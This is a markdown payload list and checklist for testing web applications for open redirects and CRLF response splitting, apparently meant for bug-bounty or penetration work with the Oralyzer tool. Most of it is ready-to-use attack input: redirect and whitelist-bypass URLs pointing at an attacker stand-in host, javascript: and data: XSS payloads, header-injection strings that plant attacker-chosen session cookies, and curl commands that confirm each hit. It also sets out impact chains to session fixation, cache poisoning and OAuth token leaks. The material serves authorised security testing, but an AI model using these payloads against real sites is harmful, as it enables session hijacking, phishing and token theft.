# Open-redirect and CRLF payloads

Attacker host: `evil.example.net`. Whitelisted/expected host: `example.com`.
Use this file as `-p payloads.txt` input for Oralyzer (one payload per line,
plain forms) and as the manual checklist.

## Open redirect — core set

```
https://evil.example.net
https://evil.example.net/
//evil.example.net
//evil.example.net/
///evil.example.net
////evil.example.net
/\evil.example.net
\/\/evil.example.net
/\/evil.example.net
\\evil.example.net
https:/evil.example.net
https:evil.example.net
https%3A%2F%2Fevil.example.net
%2F%2Fevil.example.net
%2f%2fevil.example.net
%252F%252Fevil.example.net
//evil.example.net/%2F..
//evil.example.net/..;/
https://evil.example.net%2F
```

## Whitelist / host-validation bypass (expected host example.com)

| Trick | Payload | Beats |
|---|---|---|
| userinfo `@` | `https://example.com@evil.example.net/` | startswith/contains check |
| subdomain of attacker | `https://example.com.evil.example.net/` | startswith check |
| path smuggle | `https://evil.example.net/example.com` | contains check |
| query smuggle | `https://evil.example.net/?example.com` | contains check |
| fragment smuggle | `https://evil.example.net/#example.com` | contains check |
| unescaped dot regex | `https://examplexcom.evil.example.net/` | `example.com` regex with bare `.` |
| suffix check bypass | `https://evilexample.com/` (attacker registers) | endswith `example.com` |
| double `@` | `https://example.com@example.com@evil.example.net/` | naive split on first @ |
| backslash authority | `https://example.com\@evil.example.net/` | WHATWG vs RFC parser mismatch |
| `%00` / `%09` splice | `https://evil.example.net%00.example.com/`, `https://evil.example.net%09.example.com/` | string compare after decode |
| ideographic dot | `https://evil.example.net%E3%80%82example.com/` | unicode-normalizing parsers |
| fullwidth chars | `https://evil.example.net%EF%BC%8Fexample.com/` (U+FF0F slash) | normalize-then-parse |
| port smuggle | `https://example.com:80@evil.example.net/` | host+port parsing bugs |
| CRLF-trim chars | `https://evil.example.net%0D%0A/`, trailing `%20`, `%09` | strict equality with trimming |

## Scheme payloads (escalation to XSS)

```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
javascript:alert(document.domain)//https://example.com
data:text/html,<script>alert(document.domain)</script>
```

Accepted in `Location:` → browsers ignore (safe-ish, still report the validation
gap); accepted in `location.href=` sink → DOM XSS, report as XSS (CWE-79,
WSTG-CLNT-01) instead.

## Detection mechanics

```
curl -skI "https://example.com/login?next=//evil.example.net/" | sed -n '1p;/^[Ll]ocation:/p'
```

- `HTTP/1.1 302` + `Location: //evil.example.net/` → header redirect, confirmed.
- `200` → grep body for the payload:
  `curl -sk "...payload..." | grep -niE 'location(\.href|\.replace|\.assign|=)|window\.open|meta.{0,40}refresh'`
  - inside `location.href = "PAYLOAD"` → JS redirect (and test `";alert(1)//` breakout).
  - inside `<meta http-equiv="refresh" content="0;url=PAYLOAD">` → meta redirect.
- Follow once with `curl -skL --max-redirs 1 -o /dev/null -w '%{url_effective}\n'`
  to prove the browser lands off-site.

## CRLF / response splitting (CWE-113)

Raw CR=`%0d` LF=`%0a`. Inject after a plausible value so the app still redirects:

```
/account%0d%0aSet-Cookie:%20crlf=injected
/account%0d%0aX-Injected:%20vulture
/account%0aSet-Cookie:%20crlf=injected
/account%0dSet-Cookie:%20crlf=injected
/account%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>
%0d%0aSet-Cookie:%20sid=attacker-chosen;%20Path=/
%E5%98%8D%E5%98%8ASet-Cookie:%20crlf=1        (U+560D U+560A - some stacks downcast to CRLF)
%250d%250aSet-Cookie:%20crlf=1                 (double-encoded, for decode-twice stacks)
/account%23%0d%0aSet-Cookie:%20crlf=1          (fragment-then-CRLF)
/account%3f%0d%0aSet-Cookie:%20crlf=1
```

Confirm:

```
curl -sk -D - -o /dev/null "https://example.com/login?next=/account%0d%0aSet-Cookie:%20crlf=injected"
```

`Set-Cookie: crlf=injected` present as a real response header = confirmed. The
double-CRLF body-split variant that renders `<script>` = CRLF→XSS, severity high.

Impact chain for the writeup: attacker-controlled `Set-Cookie` on the victim's
real session (fixation), cache poisoning via injected caching headers, stripping
`X-Frame-Options`/CSP by terminating headers early, reflected XSS from the split
body served under the trusted origin.

## Where open redirect escalates

- OAuth/OIDC `redirect_uri` or SAML RelayState → authorization-code/token leak: high.
- Chained into SSRF URL validation (server follows the redirect internally): see
  the `ssrf-testing` skill.
- Login-page `next=` → convincing phishing with a legitimate first hop: medium,
  but note the authenticated context in evidence.
